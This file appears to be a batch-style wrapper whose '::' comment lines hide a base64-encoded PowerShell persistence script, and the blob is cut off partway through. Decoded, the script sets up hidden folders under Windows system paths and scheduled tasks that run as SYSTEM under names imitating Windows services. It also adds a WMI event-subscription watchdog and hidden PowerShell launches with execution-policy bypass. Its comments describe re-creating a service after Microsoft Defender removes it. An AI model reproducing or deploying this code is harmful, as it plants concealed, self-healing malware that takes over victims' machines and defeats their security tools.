::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0KW0NtZGxldEJpbmRpbmco
::KV0NCnBhcmFtKA0KICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQ0K
::ICAgIFtWYWxpZGF0ZVNldCgnaW5pdCcsICd3YXRjaGRvZycsICd3YXRjaGRvZy1l
::bnN1cmUnLCAndGFza3MtZW5zdXJlJywgJ3N0YXRlJywgJ2lkZW50aXR5JywgJ3Jl
::cGFpcicsICdyZWdpc3RlcmVkJywgJ2V4dGVybWluYXRlJywgJ2dyeXhhLWhlYWx0
::aCcsICdncnl4YS1lbnN1cmUnLCAnc3luYy1ncnl4YS1mcCcsICd0ZXN0LW1zaScs
::ICdwcm90ZWN0LW1zaScsICd2ZXJpZnktdXBkYXRlJywgJ3N5bmMtc2V2cnotZnAn
::KV0NCiAgICBbc3RyaW5nXSRBY3Rpb24sDQogICAgW3N0cmluZ10kV29ya0RpciA9
::ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3Vj
::YWNoZScsDQogICAgW3N0cmluZ10kTW9uUGF0aCA9ICcnLA0KICAgIFtzdHJpbmdd
::JEJ1aWxkICA9ICdPMTUnLA0KICAgIFtzdHJpbmddJEV4dHJhICA9ICcnLA0KICAg
::IFtzdHJpbmddJEZwICAgICA9ICcnLA0KICAgIFtzd2l0Y2hdJERlZXAsDQogICAg
::W3N3aXRjaF0kRm9yY2UsDQogICAgW3N3aXRjaF0kTm9XYWl0DQopDQoNCiRFcnJv
::ckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScNCiRjZmdQYXRo
::ID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5jZmcnDQokSWRlbnRWZXJz
::aW9uID0gOA0KDQojIFJvb3QtbGV2ZWwgbmFtZXMgV0lUSE9VVCBsZWFkaW5nIGJh
::Y2tzbGFzaCAobWF0Y2hlcyB3b3JraW5nIFd1Y2FjaGVPd24gc3R5bGUpLg0KJFBv
::b2xzID0gQHsNCiAgICBBID0gQCgnV2VyUXVldWVTeW5jJywnRGlhZ0hvc3RDYWNo
::ZScsJ05ldFRyYWNlQ2FjaGUnLCdXZGlIb3N0UHJveHknLCdQbGFTZXJ2ZXJIZWFs
::dGgnLCdUY3BJcENvbmZsaWN0UmVzJywnU3JDYWNoZVN5bmMnLCdSZXNvbHV0aW9u
::UXVldWUnKQ0KICAgIEIgPSBAKCdQbGFTZXJ2ZXJIZWFsdGgnLCdXZGlIb3N0UHJv
::eHknLCdXZXJRdWV1ZVN5bmMnLCdOZXRUcmFjZUNhY2hlJywnRGlhZ0hvc3RDYWNo
::ZScsJ1RjcElwQ29uZmxpY3RSZXMnLCdQbGFTZXJ2ZXJEaWFnJywnU3JDYWNoZVN5
::bmMnKQ0KICAgIEMgPSBAKCdSZXNvbHV0aW9uUXVldWUnLCdOZXRUcmFjZUNhY2hl
::JywnVGNwSXBDb25mbGljdFJlcycsJ1dlclF1ZXVlU3luYycsJ1BsYVNlcnZlckhl
::YWx0aCcsJ0RpYWdIb3N0Q2FjaGUnLCdQbGFTZXJ2ZXJEaWFnJywnV2RpSG9zdFBy
::b3h5JykNCiAgICBEID0gQCgnVGNwSXBDb25mbGljdFJlcycsJ1Jlc29sdXRpb25R
::dWV1ZScsJ05ldFRyYWNlQ2FjaGUnLCdEaWFnSG9zdENhY2hlJywnUGxhU2VydmVy
::RGlhZycsJ1dlclF1ZXVlU3luYycsJ1BsYVNlcnZlckhlYWx0aCcsJ1dkaUhvc3RQ
::cm94eScpDQp9DQokRGVmYXVsdHMgPSBbb3JkZXJlZF1Aew0KICAgIFRBU0tfQSA9
::ICdXZXJRdWV1ZVN5bmMnDQogICAgVEFTS19CID0gJ1BsYVNlcnZlckhlYWx0aCcN
::CiAgICBUQVNLX0MgPSAnV2RpSG9zdFByb3h5Jw0KICAgIFRBU0tfRCA9ICdUY3BJ
::cENvbmZsaWN0UmVzJw0KICAgIE1PX0EgICA9ICcyJw0KICAgIE1PX0IgICA9ICcz
::Jw0KfQ0KDQpmdW5jdGlvbiBHZXQtSG9zdFNlZWQgew0KICAgICRzID0gMEwNCiAg
::ICBmb3JlYWNoICgkYyBpbiAkZW52OkNPTVBVVEVSTkFNRS5Ub1VwcGVyKCkuVG9D
::aGFyQXJyYXkoKSkgeyAkcyA9ICgkcyAqIDMxICsgW2ludF0kYykgJSAxMDAwMDAw
::MDA3IH0NCiAgICByZXR1cm4gJHMNCn0NCg0KZnVuY3Rpb24gUmVhZC1JZGVudGl0
::eSB7DQogICAgJGlkID0gJERlZmF1bHRzLkNsb25lKCkNCiAgICBpZiAoVGVzdC1Q
::YXRoICRjZmdQYXRoKSB7DQogICAgICAgIGZvcmVhY2ggKCRsaW5lIGluIChHZXQt
::Q29udGVudCAtTGl0ZXJhbFBhdGggJGNmZ1BhdGggLUZvcmNlKSkgew0KICAgICAg
::ICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/
::KVxzKiQnKSB7ICRpZFskbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXSB9DQogICAg
::ICAgIH0NCiAgICB9DQogICAgcmV0dXJuICRpZA0KfQ0KDQpmdW5jdGlvbiBSZW1v
::dmUtVGFza1F1aWV0KFtzdHJpbmddJHRuKSB7DQogICAgaWYgKCR0bikgeyAmIHNj
::aHRhc2tzLmV4ZSAvRGVsZXRlIC9UTiAkdG4gL0YgMj4mMSB8IE91dC1OdWxsIH0N
::Cn0NCg0KZnVuY3Rpb24gR2V0LVRhc2tWZXJib3NlQmxvYihbc3RyaW5nXSR0bikg
::ew0KICAgIGlmICgtbm90ICR0bikgeyByZXR1cm4gJycgfQ0KICAgICRvdXQgPSAm
::IHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1ROICR0biAvRk8gTElTVCAvViAyPiRudWxs
::DQogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91dCkgeyBy
::ZXR1cm4gJycgfQ0KICAgIHJldHVybiAoKCRvdXQgfCBGb3JFYWNoLU9iamVjdCB7
::ICIkXyIgfSkgLWpvaW4gImBuIikNCn0NCg0KZnVuY3Rpb24gVGVzdC1UYXNrT3du
::c01vbihbc3RyaW5nXSR0biwgW3N0cmluZ10kbWFya2VyKSB7DQogICAgIyBUcnVl
::IG9ubHkgaWYgdGhlIHNjaGVkdWxlZCBhY3Rpb24gcG9pbnRzIGF0IE9VUiBtb24v
::ZXRsIHBhdGgg4oCUIG5vdCBhIFdpbmRvd3MgQ09NIGhhbmRsZXIuDQogICAgJGJs
::b2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bg0KICAgIGlmICgtbm90ICRibG9i
::KSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIGlmICgkbWFya2VyIC1hbmQgKCRibG9i
::IC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJG1hcmtlcikpKSB7IHJldHVybiAkdHJ1
::ZSB9DQogICAgaWYgKCRibG9iIC1tYXRjaCAnKD9pKVwud3VjYWNoZVxcfG93bl9t
::b25cLmNtZHxldGxfbW9uXC5jbWR8XC5ldGxjYWNoZVxcJykgeyByZXR1cm4gJHRy
::dWUgfQ0KICAgIHJldHVybiAkZmFsc2UNCn0NCg0KZnVuY3Rpb24gSW5pdGlhbGl6
::ZS1JZGVudGl0eSB7DQogICAgIyBJZGVtcG90ZW50IHdpdGhpbiBhbiBJREVOVFZF
::UiBnZW5lcmF0aW9uLiBQb29sIHVwZ3JhZGVzIGJ1bXAgSURFTlRWRVI6DQogICAg
::IyBvd25lZCBvbGQtbmFtZSB0YXNrcyBhcmUgZGVsZXRlZDsgV2luZG93cyBidWls
::dC1pbnMgd2l0aCBzYW1lIG5hbWUgYXJlIGxlZnQgYWxvbmUuDQogICAgaWYgKFRl
::c3QtUGF0aCAkY2ZnUGF0aCkgew0KICAgICAgICAkb2xkID0gUmVhZC1JZGVudGl0
::eQ0KICAgICAgICAjIEw3OiBhbHNvIHJlZ2VuZXJhdGUgaWYgYW55IFRBU0tfKiBp
::cyBlbXB0eSAoTDQtTDYgbW9kdWxvL2Nhc3QgYnVncyBsZWZ0IGJsYW5rIHNsb3Rz
::KQ0KICAgICAgICAkc2xvdHNPayA9ICgkb2xkWydJREVOVFZFUiddIC1lcSAiJElk
::ZW50VmVyc2lvbiIpIC1hbmQgJG9sZFsnVEFTS19BJ10gLWFuZCAkb2xkWydUQVNL
::X0InXSAtYW5kICRvbGRbJ1RBU0tfQyddIC1hbmQgJG9sZFsnVEFTS19EJ10NCiAg
::ICAgICAgaWYgKCRzbG90c09rKSB7IHJldHVybiAkb2xkIH0NCiAgICAgICAgZm9y
::ZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tfRCcp
::IHsNCiAgICAgICAgICAgICR0biA9IFtzdHJpbmddJG9sZFska10NCiAgICAgICAg
::ICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9DQogICAgICAgICAgICAjIE5l
::dmVyIGRlbGV0ZSBhIHJlYWwgV2luZG93cyB0YXNrIHdlIG5ldmVyIG93bmVkIChU
::UiBpcyBDT00vY3VzdG9tIGhhbmRsZXIpLg0KICAgICAgICAgICAgaWYgKFRlc3Qt
::VGFza093bnNNb24gJHRuICcnKSB7IFJlbW92ZS1UYXNrUXVpZXQgJHRuIH0NCiAg
::ICAgICAgfQ0KICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGNmZ1Bh
::dGggLUZvcmNlDQogICAgfQ0KICAgICRzID0gR2V0LUhvc3RTZWVkDQogICAgIyBM
::NDogdHdvIHNsb3RzIG1heSBoYXNoIHRvIHRoZSBzYW1lIHRhc2sgcGF0aCAocG9v
::bHMgc2hhcmUgbmFtZXMpIC0+DQogICAgIyBvbmUgcGh5c2ljYWwgdGFzayB0aGVu
::IHNhdGlzZmllcyB0d28gc2xvdHMgYW5kIHRoZSBmbGVldCBzaG93cyAzLzQuDQog
::ICAgIyBXYWxrIGVhY2ggcG9vbCBmb3J3YXJkIHVudGlsIHRoZSBwaWNrIGlzIHVu
::aXF1ZSBhY3Jvc3Mgc2xvdHMuDQogICAgIyBMNjogdGhlIG9sZCBAKEAoJ0EnLCAk
::cyAlIDgpLCAuLi4pIGZvcm0gd2FzIGRvdWJsZS1icm9rZW4gaW4gUFMgNS4xOg0K
::ICAgICMgYmFyZSAlIGluc2lkZSBAKCkgcGFyc2VzIGFzIHRoZSBGb3JFYWNoLU9i
::amVjdCBhbGlhcyAobm90IG1vZHVsbyksIHNvIHRoZQ0KICAgICMgY29sbGVjdGlv
::biBjb2xsYXBzZWQgYW5kIHRoZSBsb29wIG5ldmVyIHJhbiAtPiBpZGVudGl0eS5j
::ZmcgaGFkIEVNUFRZDQogICAgIyBUQVNLXyogYW5kIHRoZSB3aG9sZSBmbGVldCBm
::ZWxsIGJhY2sgdG8gaWRlbnRpY2FsIGRlZmF1bHQgdGFzayBuYW1lcy4NCiAgICAk
::c2VlZHMgPSBbb3JkZXJlZF1Aew0KICAgICAgICBBID0gKCRzICUgOCkNCiAgICAg
::ICAgQiA9ICgoJHMgKyAzKSAlIDgpDQogICAgICAgIEMgPSAoKCRzICsgNSkgJSA4
::KQ0KICAgICAgICBEID0gKCgkcyArIDcpICUgOCkNCiAgICB9DQogICAgJHBpY2sg
::PSBbb3JkZXJlZF1Ae30NCiAgICBmb3JlYWNoICgkbGV0dGVyIGluICdBJywnQics
::J0MnLCdEJykgew0KICAgICAgICAkaSA9IFtpbnRdJHNlZWRzWyRsZXR0ZXJdDQog
::ICAgICAgICRuYW1lID0gJFBvb2xzWyRsZXR0ZXJdWyRpXQ0KICAgICAgICAkbiA9
::IDANCiAgICAgICAgd2hpbGUgKCRwaWNrLlZhbHVlcyAtY29udGFpbnMgJG5hbWUg
::LWFuZCAkbiAtbHQgOCkgeyAkaSA9ICgkaSArIDEpICUgODsgJG5hbWUgPSAkUG9v
::bHNbJGxldHRlcl1bJGldOyAkbisrIH0NCiAgICAgICAgaWYgKC1ub3QgJG5hbWUp
::IHsgJG5hbWUgPSAkRGVmYXVsdHNbIlRBU0tfJGxldHRlciJdIH0NCiAgICAgICAg
::JHBpY2tbJGxldHRlcl0gPSAkbmFtZQ0KICAgIH0NCiAgICAkY2ZnID0gQCgNCiAg
::ICAgICAgIlRBU0tfQT0kKCRwaWNrLkEpIg0KICAgICAgICAiVEFTS19CPSQoJHBp
::Y2suQikiDQogICAgICAgICJUQVNLX0M9JCgkcGljay5DKSINCiAgICAgICAgIlRB
::U0tfRD0kKCRwaWNrLkQpIg0KICAgICAgICAiTU9fQT0kKDIgKyAoJHMgJSA0KSki
::ICAgICAgICAgICMgMi01IG1pbiBqaXR0ZXINCiAgICAgICAgIk1PX0I9JCgzICsg
::KCgkcyArIDEpICUgMykpIiAgICAjIDMtNSBtaW4gaml0dGVyDQogICAgICAgICJT
::RUVEPSRzIg0KICAgICAgICAiSURFTlRWRVI9JElkZW50VmVyc2lvbiINCiAgICAp
::DQogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1WYWx1ZSAk
::Y2ZnIC1Gb3JjZQ0KICAgIHJldHVybiAoUmVhZC1JZGVudGl0eSkNCn0NCg0KZnVu
::Y3Rpb24gTm9ybWFsaXplLVRhc2tOYW1lKFtzdHJpbmddJHRuKSB7DQogICAgaWYg
::KC1ub3QgJHRuKSB7IHJldHVybiAnJyB9DQogICAgcmV0dXJuICR0bi5UcmltKCku
::VHJpbVN0YXJ0KCdcJykNCn0NCg0KZnVuY3Rpb24gV3JpdGUtT3duTG9nKFtzdHJp
::bmddJG0pIHsNCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVy
::cicNCiAgICB0cnkgeyBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFs
::dWUgJG0gLUZvcmNlIH0gY2F0Y2gge30NCn0NCg0KZnVuY3Rpb24gRW5zdXJlLVBl
::cnNpc3RUYXNrcyB7DQogICAgIyBNaXJyb3Igd29ya2luZyBkZXRhY2ggKFd1Y2Fj
::aGVPd24pOiBjbWQgc2NodGFza3MsIEJPT1QgVFIgcGF0aCwgL1NUIG9uIE1JTlVU
::RS4NCiAgICAkaWQgPSBJbml0aWFsaXplLUlkZW50aXR5DQogICAgaWYgKC1ub3Qg
::JE1vblBhdGgpIHsgJE1vblBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293bl9t
::b24uY21kJyB9DQogICAgJGJvb3QgPSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290
::ICdUZW1wXC53dWNhY2hlJw0KICAgICRldGxEaXIgPSAnQzpcUHJvZ3JhbURhdGFc
::TWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUnDQogICAgZm9yZWFj
::aCAoJGQgaW4gQCgkYm9vdCwgJGV0bERpcikpIHsNCiAgICAgICAgaWYgKC1ub3Qg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IE5ldy1JdGVtIC1JdGVtVHlw
::ZSBEaXJlY3RvcnkgLVBhdGggJGQgLUZvcmNlIHwgT3V0LU51bGwgfQ0KICAgIH0N
::CiAgICAkYm9vdE1vbiA9IEpvaW4tUGF0aCAkYm9vdCAnb3duX21vbi5jbWQnDQog
::ICAgJGJvb3RFdGwgPSBKb2luLVBhdGggJGJvb3QgJ2V0bF9tb24uY21kJw0KICAg
::ICRldGxNb24gPSBKb2luLVBhdGggJGV0bERpciAnZXRsX21vbi5jbWQnDQogICAg
::aWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE1vblBhdGgpIHsNCiAgICAgICAg
::Q29weS1JdGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJv
::b3RNb24gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
::ICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9u
::ICRib290RXRsIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0K
::ICAgICAgICBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoICRNb25QYXRoIC1EZXN0aW5h
::dGlvbiAkZXRsTW9uIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZQ0KICAgIH0NCiAgICAjIEwzNzogZGVkaWNhdGVkIGJvb3QgZ3J5eGEtaGVhbC4g
::RGVmZW5kZXIgY2FuIHN0cmlwIHRoZSBncnl4YSBTQ00gc2VydmljZSBlbnRyeSBk
::dXJpbmcNCiAgICAjIGJvb3QgYmVmb3JlIHRoZSBtb24ncyBNSU5VVEUgdGFzayBm
::aXJlcy4gQSBib290LXRyaWdnZXIgZW5zdXJlICgtTm9XYWl0IC1Gb3JjZSkgcmUt
::Y3JlYXRlcw0KICAgICMgaXQgd2l0aGluIHNlY29uZHMgb2Ygc3RhcnR1cCwgc28g
::cmVib290cyBubyBsb25nZXIgZHJvcCB0aGUgaG9zdCBmcm9tIGdyeXhhLg0KICAg
::ICRib290R3J5eGEgPSBKb2luLVBhdGggJGJvb3QgJ2dyeXhhX2Jvb3QuY21kJw0K
::ICAgICRsaWJJbkJvb3QgPSBKb2luLVBhdGggJGJvb3QgJ293bl9saWIucHMxJw0K
::ICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtE
::aXIgJ293bl9saWIucHMxJykpIHsNCiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFs
::UGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbGliLnBzMScpIC1EZXN0aW5h
::dGlvbiAkbGliSW5Cb290IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZQ0KICAgIH0NCiAgICAkZ2JMaW5lcyA9IEAoDQogICAgICAgICdAZWNobyBv
::ZmYnLA0KICAgICAgICAoJ3N0YXJ0IC9taW4gIiIgcG93ZXJzaGVsbCAtTm9Qcm9m
::aWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICJ7MH0iIC1BY3Rpb24g
::Z3J5eGEtZW5zdXJlIC1EZWVwIC1Gb3JjZSAtTm9XYWl0IC1Xb3JrRGlyICJ7MX0i
::IC1CdWlsZCBCT09UJyAtZiAkbGliSW5Cb290LCAkV29ya0RpciksDQogICAgICAg
::ICdleGl0Jw0KICAgICkNCiAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGJv
::b3RHcnl4YSAtVmFsdWUgJGdiTGluZXMgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQ0K
::ICAgICMgQk9PVCBpcyBub3QgTG9ja0RpcidkIGJ5IG93bl9zZWN1cmUg4oCUIFRh
::c2sgU2NoZWR1bGVyIGNhbiByZXNvbHZlIFRSIHRoZXJlLg0KICAgICR0ck1vbiA9
::ICJjbWQuZXhlIC9jICRib290TW9uIg0KICAgICR0ckV0bCA9ICJjbWQuZXhlIC9j
::ICRib290RXRsIg0KICAgICR0ckdyeXhhID0gImNtZC5leGUgL2MgJGJvb3RHcnl4
::YSINCiAgICAkbW9BID0gW3N0cmluZ10kaWRbJ01PX0EnXTsgaWYgKC1ub3QgJG1v
::QSkgeyAkbW9BID0gJzInIH0NCiAgICAkbW9CID0gW3N0cmluZ10kaWRbJ01PX0In
::XTsgaWYgKC1ub3QgJG1vQikgeyAkbW9CID0gJzMnIH0NCiAgICAkc3QgPSAoR2V0
::LURhdGUpLlRvU3RyaW5nKCdISDptbScpDQogICAgJHNwZWNzID0gQCgNCiAgICAg
::ICAgQHsgS2V5ID0gJ1RBU0tfQSc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNj
::ID0gJ01JTlVURSc7IE1vID0gJG1vQTsgVHIgPSAkdHJNb24gfQ0KICAgICAgICBA
::eyBLZXkgPSAnVEFTS19CJzsgTWFya2VyID0gJ2V0bF9tb24uY21kJzsgU2MgPSAn
::TUlOVVRFJzsgTW8gPSAkbW9COyBUciA9ICR0ckV0bCB9DQogICAgICAgIEB7IEtl
::eSA9ICdUQVNLX0MnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdPTlNU
::QVJUJzsgTW8gPSAnJzsgVHIgPSAkdHJNb24gfQ0KICAgICAgICBAeyBLZXkgPSAn
::VEFTS19EJzsgTWFya2VyID0gJ293bl9tb24uY21kJzsgU2MgPSAnT05MT0dPTic7
::IE1vID0gJyc7IFRyID0gJHRyTW9uIH0NCiAgICAgICAgQHsgS2V5ID0gJ1RBU0tf
::Ryc7IE1hcmtlciA9ICdncnl4YV9ib290LmNtZCc7IFNjID0gJ09OU1RBUlQnOyBN
::byA9ICcnOyBUciA9ICR0ckdyeXhhIH0NCiAgICApDQogICAgJG9rID0gMDsgJHJl
::YXJtZWQgPSAwOyAkZmFpbCA9IDANCiAgICBmb3JlYWNoICgkc3AgaW4gJHNwZWNz
::KSB7DQogICAgICAgICMgVEFTS19HIChib290IGdyeXhhLWhlYWwpIHVzZXMgYSBm
::aXhlZCBuYW1lOyB0aGUgQS1EIHJvdGF0aW9uIHBvb2wgaGFzIG5vIHNsb3QgZm9y
::IGl0Lg0KICAgICAgICAkdG4gPSBpZiAoJHNwLktleSAtZXEgJ1RBU0tfRycpIHsg
::J1d1Y2FjaGVHcnl4YUJvb3QnIH0gZWxzZSB7IE5vcm1hbGl6ZS1UYXNrTmFtZSAo
::W3N0cmluZ10kaWRbJHNwLktleV0pIH0NCiAgICAgICAgaWYgKC1ub3QgJHRuKSB7
::ICRmYWlsKys7IGNvbnRpbnVlIH0NCiAgICAgICAgaWYgKFRlc3QtVGFza093bnNN
::b24gJHRuICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0NCiAgICAgICAg
::aWYgKFRlc3QtVGFza093bnNNb24gKCJcJHRuIikgJHNwLk1hcmtlcikgeyAkb2sr
::KzsgY29udGludWUgfQ0KICAgICAgICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJs
::b2IgJHRuDQogICAgICAgIGlmICgtbm90ICRibG9iKSB7ICRibG9iID0gR2V0LVRh
::c2tWZXJib3NlQmxvYiAoIlwkdG4iKSB9DQogICAgICAgIGlmICgkYmxvYikgew0K
::ICAgICAgICAgICAgJG91cnNCcm9rZW4gPSAoJGJsb2IgLW1hdGNoICcoP2kpb3du
::X21vblwuY21kfGV0bF9tb25cLmNtZHxncnl4YV9ib290XC5jbWR8XC53dWNhY2hl
::XFx8XC5ldGxjYWNoZVxcJykNCiAgICAgICAgICAgIGlmICgtbm90ICRvdXJzQnJv
::a2VuKSB7ICRmYWlsKys7IFdyaXRlLU93bkxvZyAidGFza3Nfc2tpcF9mb3JlaWdu
::ICR0biI7IGNvbnRpbnVlIH0NCiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQg
::JHRuDQogICAgICAgICAgICBSZW1vdmUtVGFza1F1aWV0ICgiXCR0biIpDQogICAg
::ICAgIH0NCiAgICAgICAgIyBCdWlsZCBjbWRsaW5lIGV4YWN0bHkgbGlrZSBvd24u
::Y21kIGRldGFjaCAocHJvdmVuIHRvIHdvcmsgYXMgU1lTVEVNKS4NCiAgICAgICAg
::JHBhcnRzID0gQCgNCiAgICAgICAgICAgICcvQ3JlYXRlJywgJy9UTicsICR0biwg
::Jy9SVScsICdTWVNURU0nLCAnL1JMJywgJ0hJR0hFU1QnLCAnL0YnLA0KICAgICAg
::ICAgICAgJy9UUicsICRzcC5UciwgJy9TQycsICRzcC5TYw0KICAgICAgICApDQog
::ICAgICAgIGlmICgkc3AuU2MgLWVxICdNSU5VVEUnKSB7DQogICAgICAgICAgICAk
::cGFydHMgKz0gQCgnL01PJywgJHNwLk1vLCAnL1NUJywgJHN0KQ0KICAgICAgICB9
::DQogICAgICAgICRhcmdMaW5lID0gKCRwYXJ0cyB8IEZvckVhY2gtT2JqZWN0IHsN
::CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ1tccyJdJykgeyAnInswfSInIC1m
::ICgkXyAtcmVwbGFjZSAnIicsICdcIicpIH0gZWxzZSB7ICRfIH0NCiAgICAgICAg
::fSkgLWpvaW4gJyAnDQogICAgICAgICRjcmVhdGVUeHQgPSBjbWQuZXhlIC9jICJz
::Y2h0YXNrcy5leGUgJGFyZ0xpbmUiIDI+JjEgfCBGb3JFYWNoLU9iamVjdCB7ICIk
::XyIgfQ0KICAgICAgICAkY3JlYXRlSm9pbmVkID0gKCRjcmVhdGVUeHQgLWpvaW4g
::JyAnKS5UcmltKCkNCiAgICAgICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVhdGUg
::JCgkc3AuS2V5KSAkdG4gPT4gJGNyZWF0ZUpvaW5lZCINCiAgICAgICAgaWYgKChU
::ZXN0LVRhc2tPd25zTW9uICR0biAkc3AuTWFya2VyKSAtb3IgKFRlc3QtVGFza093
::bnNNb24gKCJcJHRuIikgJHNwLk1hcmtlcikpIHsNCiAgICAgICAgICAgICRyZWFy
::bWVkKysNCiAgICAgICAgICAgIGlmICgkc3AuS2V5IC1lcSAnVEFTS19BJyAtb3Ig
::JHNwLktleSAtZXEgJ1RBU0tfQicpIHsNCiAgICAgICAgICAgICAgICBjbWQuZXhl
::IC9jICJzY2h0YXNrcy5leGUgL1J1biAvVE4gYCIkdG5gIiIgfCBPdXQtTnVsbA0K
::ICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJGZh
::aWwrKw0KICAgICAgICAgICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVhdGVfRkFJ
::TCAkKCRzcC5LZXkpICR0biINCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4g
::InRhc2tzIG9rPSRvayByZWFybWVkPSRyZWFybWVkIGZhaWw9JGZhaWwiDQp9DQoN
::CmZ1bmN0aW9uIFJlbW92ZS1XYXRjaGRvZyB7DQogICAgZm9yZWFjaCAoJGNscyBp
::biBAKCdfX0ZpbHRlclRvQ29uc3VtZXJCaW5kaW5nJywnX19FdmVudEZpbHRlcics
::J0NvbW1hbmRMaW5lRXZlbnRDb25zdW1lcicsJ19fSW50ZXJ2YWxUaW1lckluc3Ry
::dWN0aW9uJykpIHsNCiAgICAgICAgR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJv
::b3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyAkY2xzIC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlIHwNCiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7DQogICAgICAg
::ICAgICAgICAgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dGJykgLW9yICgk
::Xy5OYW1lIC1lcSAnV3VjYWNoZVdhdGNoZG9nQycpIC1vcg0KICAgICAgICAgICAg
::ICAgICgkXy5UaW1lcklkIC1lcSAnV3VjYWNoZVdhdGNoZG9nJykgLW9yDQogICAg
::ICAgICAgICAgICAgKCRfLkZpbHRlciAtYW5kICRfLkZpbHRlci5Ub1N0cmluZygp
::IC1saWtlICcqV3VjYWNoZVdhdGNoZG9nRionKSAtb3INCiAgICAgICAgICAgICAg
::ICAoJF8uQ29uc3VtZXIgLWFuZCAkXy5Db25zdW1lci5Ub1N0cmluZygpIC1saWtl
::ICcqV3VjYWNoZVdhdGNoZG9nQyonKQ0KICAgICAgICAgICAgfSB8IEZvckVhY2gt
::T2JqZWN0IHsgJF8uRGVsZXRlKCkgfCBPdXQtTnVsbCB9DQogICAgfQ0KfQ0KDQpm
::dW5jdGlvbiBJbnN0YWxsLVdhdGNoZG9nIHsNCiAgICBpZiAoLW5vdCAkTW9uUGF0
::aCkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICBSZW1vdmUtV2F0Y2hkb2cNCiAgICAk
::b2sgPSAkdHJ1ZQ0KICAgIHRyeSB7DQogICAgICAgIFNldC1XbWlJbnN0YW5jZSAt
::TmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ludGVydmFsVGlt
::ZXJJbnN0cnVjdGlvbiBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IFRpbWVy
::SWQgPSAnV3VjYWNoZVdhdGNoZG9nJzsgSW50ZXJ2YWxNaWxsaXNlY29uZHMgPSAx
::ODAwMDA7IFNraXBJZlBhc3NlZCA9ICRmYWxzZSB9IHwgT3V0LU51bGwNCiAgICAg
::ICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlw
::dGlvbiAtQ2xhc3MgX19FdmVudEZpbHRlciBgDQogICAgICAgICAgICAtQXJndW1l
::bnRzIEB7IE5hbWUgPSAnV3VjYWNoZVdhdGNoZG9nRic7IEV2ZW50TmFtZXNwYWNl
